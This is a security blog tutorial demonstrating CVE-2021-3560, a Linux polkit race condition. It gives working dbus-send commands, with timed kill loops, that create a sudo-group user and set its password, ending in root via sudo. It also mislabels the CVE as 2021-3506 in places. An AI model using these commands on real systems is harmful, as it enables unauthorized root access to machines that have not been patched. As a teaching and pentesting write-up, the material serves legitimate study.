<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux Privilege Escalation: Polkit (CVE 2021-3560)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-privilege-escalation-polkit-cve-2021-3560/" rel="bookmark"><time class="entry-date published" datetime="2022-01-30T18:44:53+00:00">January 30, 2022</time><time class="updated" datetime="2025-05-10T20:31:10+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">According to Red Hat, “Polkit stands for PolicyKit which is a framework that provides an authorization API used by privileged programs.” Pkexec is a tool in PolicyKit or polkit that allows a user to run a command as a different user. This vulnerability tricks polkit into bypassing the credential checks for D-Bus requests, elevating the privileges of the requestor to the root user. It was discovered by Kevin Backhouse and can be read <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/">here</a></strong></span>.</span></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<ul>
<li><span style="color: #000000;">Polkit, pkexec and dbus</span></li>
<li><span style="color: #000000;">Background of CVE 2021-3506</span></li>
<li><span style="color: #000000;">Exploitation of CVE 2021-3506</span></li>
<li><span style="color: #000000;">Conclusion</span></li>
</ul>
<h3><span style="color: #800000;"><strong>polkit, pkexec, and dbus</strong></span></h3>
<p><span style="color: #000000;"><strong>Polkit and pkexec: </strong>PolicyKit is also known as polkit in Linux systems. It is an authorization API used by programs to elevate its permissions to that of an elevated user and run processes as an elevated user (root, generally). If the user is not specified it tries to run that command as the root user. Sudo does the same thing in terms that it lets a user run commands as root, however, with pkexec, admins can finely control the execution of particular programs by defining policies for it. Sudo has no restriction and a user may run any command as an elevated user given he knows the password. Pkexec also takes some effort in setting up but Debian variants, including the popular Ubuntu, come with polkit and pkexec pre-installed. These authorization rules for third party packages are defined in *.rules JavaScript files kept in the directory <strong>/usr/share/polkit-1/rules.d/</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj77dYTvGor53fRoXffG5NAViBqZF4vvUf0PeGwjfAJXu6BSgAu5jxV-somrzxrwlVbrmiPBpmaezYWd483LMcy2wPmziixcnORRcvDW_sT4AmTZn5CNEkLT-tUEo92aRe7xpq2APECG8M0xVEPxDxi_CMka7OzjEGjkZXNwP0enewC9npLqh8Fkwx6Yw=s16000"/></span></p>
<p><span style="color: #000000;">While authorization rules for local customization are stored in <strong>/etc/polkit-1/<br/>
</strong>You would observe *.conf files here. Conf and pkla files used to exist before *.rules and are there for backwards compatibility reasons.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjDR5CMonRcXCNUpJ1NA1uOJ7CUjdPBV2u0FmcpsBtS7bd6moJ8FPDo9Wa95vnyz2i6ENSiA9-NkTsNTUjd5oFtSh8ZJ9405U2Csx9WIJHXYbl0jJrUs4n2Ihi7ce506UO8GVFWNSZRx0_YRJQ_DNfJ2PbsuNYEYH0H8OX3JIAXfIqlSTcUNODPgyhZpQ=s16000"/></span></p>
<p><span style="color: #000000;"><strong>dbus: </strong>dbus is a message system for applications to talk to one another (known as IPC or interprocess communication). This was developed as part of the freedesktop.org project. A basic dbus command to list system services looks like this:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply \
/org/freedesktop/DBus org.freedesktop.DBus.ListNames</pre>
<p><span style="color: #000000;">In this demo, we’ll be using dbus to trigger pkexec from the command line. You can read more about dbus <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.freedesktop.org/wiki/Software/dbus/">here</a></strong></span>.</span></p>
<h3><span style="color: #800000;"><strong>Background of CVE 2021-3506</strong></span></h3>
<p><span style="color: #000000;">Polkit is a background process that allows authorization but it has a graphical prompt that Ubuntu users must be familiar with. It looks like this:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhZMLUD6_yde6zKL8j8k8_bR5Ae3zECHZ9MVOWubc2pOoyP-oqO8rXRguXdPXhGEWgcMr1kkH1qtOWrfujF6ZroLGoJxjbt29X_9T5ldR3c-_T62aYXMmOndW6pTwJWyacH8Rt4tysBkXJSyGrsiISy-uB-DOslx1vlqQ28DLKZP3YmeCfOi9hSIlA6wA=s16000"/></span></p>
<p><span style="color: #000000;">However, polkit is executed in text mode too while using text-mode session, for example, while using ssh.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh pentest@192.168.1.141
pkexec sh</pre>
<p><span style="color: #000000;">As you can see, pkexec has now been executed in CLI.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhq0UwQ6HDKGkynKrlarKwzmVA9pN4t8DL_zMT1Yx9kddRSxL5WQAJ3xEgUB-al1W5LXMBhhn3qfZDnXJ_B2yyJ24s0VuHkizcIuw2--h-kNAcIUm07VoatRx9RT7qxSvM83ek0uAKOfLm1PLQJBFRG3rBM5zK8ehsWEjlft_EMo1DnrOABZX9tQOHd3w=s16000"/></span></p>
<h4><span style="color: #000000;">Introduction to dbus and Service Files</span></h4>
<p><span style="color: #000000;">Now getting back to dbus here. It is an IPC agent which can help us to send commands or messages to other processes and communicate with them. To perform operations, dbus has various service files configured that reference the absolute paths of executables or daemons that are to be triggered. For system processes, dbus stores service files in /usr/share/dbus-1/system-services. Here, you can see the contents of the hostname. service which performs hostname modification operations in Ubuntu and Accounts. service which triggers accounts-daemon to perform user addition/modification options.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgSPJzYI3bYDasIsJXVU6hVPV7JAGBeKH5nF3z7q2nnBvUUPn5cxfRaahyDUB2KQclThQcImMTNupPOdZWTn9UMR52BVt-vlyoKz__4nEHntMSnBlcAFQb7hUnopyj-S1SQIvtJRNqSsDuTmRa0EXIug8a1ywy9w5RuhnU38Bl4ZhVX8_-vmPQsB0vHJQ=s16000"/></span></p>
<p><span style="color: #000000;">So, dbus can be used to execute a command and request polkit’s authorization for it. Each interface and method has its own XML configuration file that will reveal what parameters dbus sends to it while executing. We won’t get into that right now.</span></p>
<h4><span style="color: #000000;">Discovery of the Vulnerability and demonstration of the Exploit</span></h4>
<p><span style="color: #000000;">Kevin Backhouse posted <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#about">this</a> </strong></span>article where he detected a vulnerability in polkit that can be triggered by running the dbus-send command but killing it while polkit is still executing it and execution isn’t complete. In this demonstration, we will be creating a new user in the system without a root password. For that we would first launch a text-only session using ssh and then the <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://dbus.freedesktop.org/doc/dbus-send.1.html">dbus-send</a></strong></span> command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:ignite string:"ignite user" int32:1</pre>
<p><span style="color: #000000;">–system: sends message to the system bus</span></p>
<p><span style="color: #000000;">–dest: name of the connection (interface) that receives the message</span></p>
<p><span style="color: #000000;">–type: method_call means a system function with arguments being passed</span></p>
<p><span style="color: #000000;">–print-reply: prints the output in human-readable format</span></p>
<p><span style="color: #000000;">/org/freedesktop/Accounts: This is the function that will be used</span></p>
<p><span style="color: #000000;">org.freedesktop.Accounts.CreateUser: Method that will be used. Here, create user method is used which will essentially create a new user with the name specified in string 1. String 2 is the name (“ignite user”) that will be visible in the system. int32 is an integer argument the method takes in that specifies the type of account encoded as an integer.</span></p>
<p><span style="color: #000000;">You can find the configuration xml file for this method <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://cgit.freedesktop.org/accountsservice/tree/data/org.freedesktop.Accounts.xml">here</a></strong></span>.</span></p>
<p><span style="color: #000000;">But this will fail as authentication is required for us to create a new user.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg0jalx-Pl5ZnyC3v253zug88MKUi5i-YNdx-eTA7J_sCcfmNVZ5ktJwkuC16QZdEvv-6IvHVf_PA8m_HvSFd_6aoRi6gr3vrR5FRM5UabXZH01NEzvo_doRCgvjNp_7nucuXCgRRIzbKtv9Tz0L5HkLafMG9TWT68kEZUNLruyTP88ymSFeiMnMNz16g=s16000"/></strong></span></p>
<h3><span style="color: #800000;"><strong>Exploitation of CVE 2021-3506</strong></span></h3>
<p><span style="color: #000000;">For the exploit to work, we need to kill the command while it is being executed. For this we need to check the time it takes to execute this command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:ignite string:"ignite user" int32:1</pre>
<p><span style="color: #000000;">As you can see, it takes me 0.008 seconds to execute this command. So, I need to kill my payload before 0.008 seconds for it to work.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEibkILJ1tKR_dGar4HtyR13zgesS4IGc_PkSP6jI7s5oOVLIbXW5yUwNH0cIKcx025lKJ1Gg5_AQZYsD4SMVL_YpzM06Zrs2WOievd-k5SCTTnttrlT50wrW8wEpBlSLP7rdX4wzwfz16a7iga7Ex8Iu5X4eijWjhhYegewR2wq5F9RCbf129XMHM3RWw=s16000"/></span></p>
<p><span style="color: #000000;">Kevin mentions a user can hit CTRL+C quickly and it should work but better leave it to a simple inline bash script to kill the process in 0.0035 seconds. Note that we tried a lot of times and the time needed to run was different every time. So, you would need to experiment with it too and see which time suits you and would let the exploit run properly. Here</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:ignite string:"ignite user" int32:1 &amp; sleep 0.0035s ; kill $!</pre>
<p><span style="color: #000000;">We ran the same command about 5-7 times before our user ignite got created! What’s more, is that ignite is a member of the sudo group!</span></p>
<h4><span style="color: #000000;">How did it work?</span></h4>
<p><span style="color: #000000;"> Dbus assigns a unique ID to any connection. Polkit verifies that Unique ID and provides authorization. Let’s say the UID is 1.87. Since, the connection breaks in between, polkit recognizes the UID as 0 and considers the request coming from the root. Hence, this is how the exploit works.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjRh8N7aYayfkMLdIMWuJjiatZaD9WvLxVkEcZBQq0FPfqs7GgipNrh7H2JvFVw0jQBw8S1CBW_7Fa31OMJu7nd6gdH2m7gOg__uj3AU9HwjRXei11mbDQkK0eXW12hijjzjIBBXwzoFlk1sVY4licrxzTwkYJCyHYt8CGloOnuCegSsHxoGlKoGnTniA=s16000"/></span></p>
<p><span style="color: #000000;">We can check the /etc/passwd for its validity. Also, as you can see the uid is 1001 here.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">tail -n 3 /etc/passwd</pre>
<p><span style="color: #000000;">Next, we need to supply the password using dbus so that we can use this newly created user. We need to generate a hashed password as dbus-send takes in hashed password as input.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl passwd -5 ignite@123</pre>
<p><span style="color: #000000;">This would generate a hash in SHA-256 format. We can use any other encryption too as per the system configuration.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiJEsziyM2BGe-VnS1eB_4v8b-qO_NGNXpO4k1j4ZyQot3GaRUs7oeyqzvnUsM9S9eEWx4abH-M21_CAoYNMCvGnQaSEciuBinewVsAfXFppVIkeGBay_VIEmvtHUVXCOGTE2RYK6m1_LcJIFS5YRcqlfJuLQ-7OWRd18y9wvC6hBvbJ6X2tZohS6xzzQ=s16000"/></span></p>
<p><span style="color: #000000;">Now we need to pass this hash in User.SetPassword function using dbus under a string parameter. The payload looks like:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1001 org.freedesktop.Accounts.User.SetPassword string:'$5$F2KwiUlWkn2i8DC.$rw9AOjKsmK83DhncqehVUzOKVqq.ArwS2G8eQKVntv7' string:BestHackingTutorials &amp; sleep 0.0035s ; kill $!</pre>
<p><span style="color: #000000;">Here,<span style="color: #0000ff;"><strong> User.SetPassword</strong></span> has been used. Two parameters are passed. The first string is the hashed credential and the second string: “BestHackingTutorials” is the password hint. This can be changed too.</span></p>
<p><span style="color: #000000;">We need to send this command 6-7 times for this to run. We can login to this user now.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su ignite
password: ignite@123
whoami
id</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg_yCwBZs9uCkyo3F4lZCV3qbBJffaJGa9XnKOx0Zhu4XQ7v1GPYjAIxkPusy4uJh3sNwCWgFtpWUmzge6JWkAYdNXlhqkrGGHdAWrtIy6TQ1qfqUad-Czs8bzLLZdjyFWXXbG1nmsl1V1Ry-2Abk5uwh2ZOFqAfzIun6FDdstidxHBuVLMYXz3pfiUJw=s16000"/></span></p>
<p><span style="color: #000000;">Finally, you can escalate your privileges by sudo bash as user ignite is a member of the sudo group.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgSBo644Zeio-WP9cA83SXkna_BJHom5nBRKSSB6PkwgcezRAhpABYISLzO1WCRkEkfWIOB2yO6NjP2BV8l2hifMkWMTMWxqaWtRvoGGV1J_fbukULwtpuTleuYOprnEiAT4QXK9c9WH9I1dsDqyuyiPKRTcBFZHfnc6ODtDwibLvw-Mh7eGQPCmeX8Rw=s16000"/></span></p>
<h3><span style="color: #800000;"><strong>Conclusion</strong></span></h3>
<p><span style="color: #000000;">Polkit is a pre-installed package in Linux distros. Any system running polkit version &lt; 0.119 is vulnerable to privilege escalation through this method. It has a high impact rating and exploitation is fairly easy as no exploit development knowledge is required. Hope you enjoyed the article. Thanks for reading.</span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact<strong> <span style="color: #0000ff;"><a class="broken_link" style="color: #0000ff;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></span></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
